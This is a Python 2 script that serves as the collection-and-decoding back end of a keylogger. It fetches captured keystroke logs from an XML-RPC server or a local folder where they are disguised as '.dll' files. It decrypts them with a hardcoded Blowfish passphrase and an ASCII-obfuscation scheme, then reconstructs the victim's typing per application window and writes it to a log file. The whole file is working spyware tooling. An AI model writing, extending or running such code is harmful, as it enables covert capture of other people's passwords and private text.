import cPickle
import blowfish
import os, sys
import re
import xmlrpclib

bf_passphrase = '3138363238322e343035'

programs = []
KMA_DIR = "data"


key_convert = {'Space':' ', 
			'Return':'\n',
			'Back':'(<-b)',
			'Oem_Period':'.',
			'Tab':'	',
			'Escape':'<escape>',
			'Home':'<home>',
			'Insert':'<insert>',
			'Pause':'<pause>',
			'Numlock':'<numlock>',
			'Snapshot':'<print_screen>',
			'Prior':'\n<page_up>',
			'Next':'\n<page_down>',
			'Up':'\n<up_arrow>',
			'Down':'\n<down_arrow>',
			'Right':'\n<right_arrow>',
			'Left':'\n<left_arrow>',
			'shift':'<shift>',
			'lshift':'<lshift>',
			'rshift':'<rshift>',
			'oem_1':';',
			'oem_minus':'-'}
			
def translate_results(dict, modlines):
    """
    Takes input and swaps out text values for value key pairs defined by matches in a dictionary
    """
    for k, v in dict.iteritems():
         modlines = re.sub(k, v, modlines)
    return modlines

def unfish_it(string, passphrase):
    cipher = blowfish.Blowfish (passphrase)
    cipher.initCTR()
    text = string
    decrypted = cipher.encryptCTR(text)
    
    return decrypted

def c_decrypt(string):
    #Converting Back from ASCII STRING
    ascii_list = []
    ascii_key_list = []
    
    #Split string by letters and place in a list
    for word in string.split('@'):
            ascii_list.append(word)
    #take list of ascii numbers and convert to letters
    for ascii in ascii_list:
	    ascii_char = int(ascii)
	    ascii_key = chr(ascii_char).lower()
	    ascii_key_list.append(ascii_key)
    #join letters into big string and split by ',' character
    key_string2 = "".join(ascii_key_list).split(',')
	    
    return key_string2
    

#define unpickle function
def unpickle(pickle_file):
	Pickle_file2 = open(pickle_file, 'rb')
	print "pickled: %s" % (pickle_file)
	unpickled = cPickle.load(Pickle_file2)
	
	return unpickled

def log_line(line):
    filename = 'c:\\test_read.log'
    file = open(filename, 'a')
    line = line.lower()
    file.write(line)
    file.close()
    
def make_clr_lists(hash):
    key_list_clr = []
    #unhash and decrypt the data
    for key_info in hash:
	    #undo the blowfish encryption
            unfished_item = unfish_it(key_info, bf_passphrase)
	    #Undo the hashing of the strings and return key event list
	    decrypt_item = c_decrypt(unfished_item)
	    #add the key event lists to greater key_list
	    #key_list.append(decrypt_item)
	    key_list_clr.append(decrypt_item)
	    
	    #get the program names from the key info list
      	    program = decrypt_item[1]
	    #create a unique list of programs with key data
	    if program not in programs:
		    programs.append(program)
		    
    #return unique list of program names
    return programs, key_list_clr
    
def setrundir():
    pathname = os.path.dirname(sys.argv[0])
    fullpath = os.path.abspath(pathname) 
    os.chdir(fullpath)
    
def list_server_available():
    try:
	    
        key_files = proxy.list_available()
	
	return key_files
	
    except:
	    
	    print "\nServer unavailable?"
	    
	    
#list key_files available
def list_keyfiles(dir):
    setrundir()

    os.chdir(dir)
    #define dll content list
    dll_list = []
    contents = os.listdir('.')
    for item in contents:
	    if '.dll' in item:
		    dll_list.append(item)
    return dll_list
	    
def get_keylog(logfile):
    destination = "data\\%s" % (logfile)
    with open(destination, "wb") as handle:
        handle.write(proxy.read_binary(logfile).data)
    print destination
    return destination

def get_keytext(programs_list, key_list):
    #for each program in programs create an empty list
    for program in programs_list:
	    program_keys = []
	    #for every key press in the overall key_list figure out the program and key
	    for key_press in key_list:
		    key_press_program = key_press[1]
		    key_pressed = key_press[3]
		    #if the program in the key string matches the program
		    #in the programs list, then lookup in dict for replacement
		    #and add it to the program_keys list
		    if key_press_program == program:
			    for k, v in key_convert.iteritems():
				    if k.lower() == key_pressed:
					    key_pressed = v
			    program_keys.append(key_pressed)
			    
	    print '\n'
            print '----------\n\n'
	    log_line("Start of dump...\n\nWindows in dump: %s\n" % (len(programs)))
	    log_line('\n\n-----------\n-----------\n')
            print 'Window name: ', program, '\n'
	    log_line("Window name: %s\n\n" % (program))
	    for key in program_keys:
		    sys.stdout.write(key)
		    log_line(key)
	    log_line('\n\n-----------\n')
	    
def main():
    global proxy
    key_logs = {}


    #set run directory to current directory of script
    setrundir()

    #user picks out of list of available key logs
    file_store = raw_input("\n\nlocal or remote keylog store??   ")    


    #Define key server
    proxy = xmlrpclib.ServerProxy("http://localhost:8001/")
       
    #Get list of available key logs    
    key_files = list_server_available()
    
    if file_store == "remote":
        keyfile_count = len(key_files)
        print "\nLogs Available: ", keyfile_count, '\n'
    
        #create a dictionary of key log files by number
        count = 0
        for item in key_files:
	        count += 1
	        key_logs[count] = item
	    
        for k, v in key_logs.iteritems():
	        print k, v
    
    local_keyfiles = list_keyfiles(KMA_DIR)
    print local_keyfiles
    
    if file_store == "local":
	print "\n\nServer %s is unavailable.  \nShowing local key log store" % (proxy)
        keyfile_count = len(local_keyfiles)
        print "\nLogs Available: ", keyfile_count, '\n'
    
        #create a dictionary of key log files by number
        count = 0
        for item in local_keyfiles:
	        count += 1
	        key_logs[count] = item
	    
        for k, v in key_logs.iteritems():
	        print k, v    
    
    #user picks out of list of available key logs
    user_log_choice = input("\n\nWhich log do you want (press #)?   ")
    
    print user_log_choice
    
    #lookup user choice in generated dictionary
    Pickle_file = key_logs[user_log_choice]
    print Pickle_file
    print file_store
    
    if file_store == "remote":
        #Get key archive from server
        key_archive = get_keylog(Pickle_file)
    
    if local_keyfiles:
	    key_archive = Pickle_file
	    
    
    print "\nKey file archived: ", key_archive, '\n'
   
    #Get the pickled data from file
    data = unpickle(key_archive)
    
    #Return a clear unique list of programs and key events    
    programs_clr, key_list_clr = make_clr_lists(data)
    
    get_keytext(programs_clr, key_list_clr)

    print '---'
    
main()